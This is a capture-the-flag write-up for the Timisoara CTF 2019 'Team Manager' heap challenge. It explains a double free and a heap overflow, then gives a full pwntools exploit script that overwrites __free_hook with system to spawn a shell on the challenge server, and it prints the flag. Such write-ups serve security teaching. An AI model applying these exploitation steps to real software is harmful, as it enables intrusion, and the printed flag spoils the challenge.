I"à^<p><strong>Category:</strong> Binary Exploitation</p>

<blockquote>
  <p>I found the team manager service used for Timisoara CTF. Do you think it is secure?<br />
nc 89.38.208.144 11114</p>
</blockquote>

<p><a href="https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Team%20Manager%20%5B300%5D" class="btn btn--primary">Challenge Files</a></p>

<h2 id="write-up">Write-up</h2>
<p>Running the binary instantly shows this is a standard heap challenge:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to the Timctf Team Manager
1: Add player
2: Remove player
3: Edit player
4: View player
5: View team
0: Exit
</code></pre></div></div>

<p>After analyzing the binary using Ghidra, a few observations can be made:</p>
<ul>
  <li>Chunks on the heap can be freed multiple times without checks. There is a double free() vulnerability, which leaks an address pointing to the heap.</li>
  <li>Input is vulnerable to a heap overflow. By overflowing the ‚Äúcomments‚Äù section for one chunk, we can overwrite addresses on the following chunk.</li>
</ul>

<p>The exploit follows the following order:</p>

<ol>
  <li>
    <p><strong>Leak heap address</strong><br />
Leak the heap address using the double free() vulnerability. The address is stored in the ‚Äúreversing and exploitation‚Äù and ‚Äúcrypto‚Äù areas in the heap. Viewing the team outputs the leaked heap address.</p>
  </li>
  <li>
    <p><strong>Leak printf address</strong><br />
Using the heap overflow, overwrite the pointer to the ‚Äúcomments‚Äù section in the second chunk with the address of <code class="highlighter-rouge">printf</code> in the <code class="highlighter-rouge">GLOBAL OFFSET TABLE (GOT)</code>.Viewing the second player outputs the leaked <code class="highlighter-rouge">printf</code> address.</p>
  </li>
  <li>
    <p><strong>Calculate libc base</strong><br />
Standard ret2libc procedure. Libc base can be calculated using <code class="highlighter-rouge">printf - printf_offset</code>, where <code class="highlighter-rouge">printf</code> is the leaked address and <code class="highlighter-rouge">printf_offset</code> is the address of <code class="highlighter-rouge">printf</code> in libc. With libc base value, the address of <code class="highlighter-rouge">__free_hook</code> and <code class="highlighter-rouge">system</code> can be calculated using <code class="highlighter-rouge">libc_base + system_offset</code> and <code class="highlighter-rouge">libc_base + __free_hook_offset</code> respectively.</p>
  </li>
  <li>
    <p><strong>Overwrite __FREE_HOOK pointer with system</strong><br />
Overwrite the pointer to the ‚Äúcomments‚Äù section in the second chunk with the address of <code class="highlighter-rouge">__free_hook</code>. This makes the pointer point to the <code class="highlighter-rouge">__free_hook</code> instead. <code class="highlighter-rouge">__free_hook</code> can then be overwritten with the address of <code class="highlighter-rouge">system</code> by editing the ‚Äúcomments‚Äù of the second chunk. Calling free() now calls system() instead.</p>
  </li>
  <li>
    <p><strong>Write /bin/sh into heap address</strong>
Write the string <code class="highlighter-rouge">/bin/sh\x00</code> (<em>0x0068732f6e69622f</em> in hex) into the leaked heap address. The argument for free() is stored in this address when free() is called. When calling free() on first chunk, system(/bin/sh) is called instead, which executes a shell.</p>
  </li>
</ol>

<p>Here‚Äôs the final exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./timctf_manager"</span><span class="p">,</span>
    <span class="s">"libc"</span> <span class="p">:</span> <span class="s">"./libc-2.27.so"</span><span class="p">,</span>
    <span class="s">"ld"</span> <span class="p">:</span> <span class="s">"./ld-2.27.so"</span><span class="p">,</span>
    <span class="s">"HOST"</span> <span class="p">:</span> <span class="s">"89.38.208.144"</span><span class="p">,</span>
    <span class="s">"PORT"</span> <span class="p">:</span> <span class="mi">11114</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">reversing</span><span class="p">,</span> <span class="n">web</span><span class="p">,</span> <span class="n">crypto</span><span class="p">,</span> <span class="n">forensics</span><span class="p">,</span> <span class="n">comment</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"0: Exit"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter player id (1-4) "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's name: "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at reversing and exploitation: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">reversing</span><span class="p">))</span> 
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at web exploit: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">web</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at crypto: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">crypto</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at forensics: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">forensics</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Extra note/comment: "</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">pid</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"0: Exit"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter player id (1-4) "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">reversing</span><span class="p">,</span> <span class="n">web</span><span class="p">,</span> <span class="n">crypto</span><span class="p">,</span> <span class="n">forensics</span><span class="p">,</span> <span class="n">comment</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"0: Exit"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter player id (1-4) "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's name: "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at reversing and exploitation: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">reversing</span><span class="p">))</span> 
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at web exploit: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">web</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at crypto: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">crypto</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Player's skill at forensics: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">forensics</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Extra note/comment: "</span><span class="p">,</span> <span class="n">comment</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">viewplayer</span><span class="p">(</span><span class="n">pid</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"0: Exit"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter player id (1-4) "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">viewteam</span><span class="p">():</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"0: Exit"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">tohex</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">nbits</span><span class="p">):</span>
  <span class="k">return</span> <span class="nb">hex</span><span class="p">((</span><span class="n">val</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">nbits</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
	<span class="n">print_menu</span> <span class="o">=</span> <span class="mh">0x00400827</span>
	<span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
	<span class="n">data</span>  <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">".data"</span><span class="p">).</span><span class="n">header</span><span class="p">.</span><span class="n">sh_addr</span>

	<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
	<span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
	<span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">viewteam</span><span class="p">()</span>

	<span class="n">ru</span><span class="p">(</span><span class="s">'reversing and exploitation: '</span><span class="p">)</span>
	<span class="n">lo</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
	<span class="n">lo</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">tohex</span><span class="p">(</span><span class="n">lo</span><span class="p">,</span> <span class="mi">32</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span>
	<span class="n">ru</span><span class="p">(</span><span class="s">"crypto: "</span><span class="p">)</span>
	<span class="n">hi</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">())))</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">hi</span> <span class="o">+</span> <span class="n">lo</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span><span class="o">*</span><span class="mi">264</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>

	<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="n">viewplayer</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
	<span class="n">ru</span><span class="p">(</span><span class="s">"Extra note/comment: "</span><span class="p">)</span>

	<span class="n">printf</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
	<span class="n">base</span> <span class="o">=</span> <span class="n">printf</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
	<span class="n">free_hook</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
	<span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
	
	<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span><span class="o">*</span><span class="mi">264</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span><span class="o">*</span><span class="mi">264</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0068732f6e69622f</span><span class="p">))</span>
	<span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	
	<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

    <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="n">config</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]:</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>

    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"remote"</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"HOST"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"PORT"</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">():</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
        <span class="k">else</span><span class="p">:</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

        <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag:</strong> TIMCTF{Heap_overfl0ws_are_really_B4D}</p>
:ET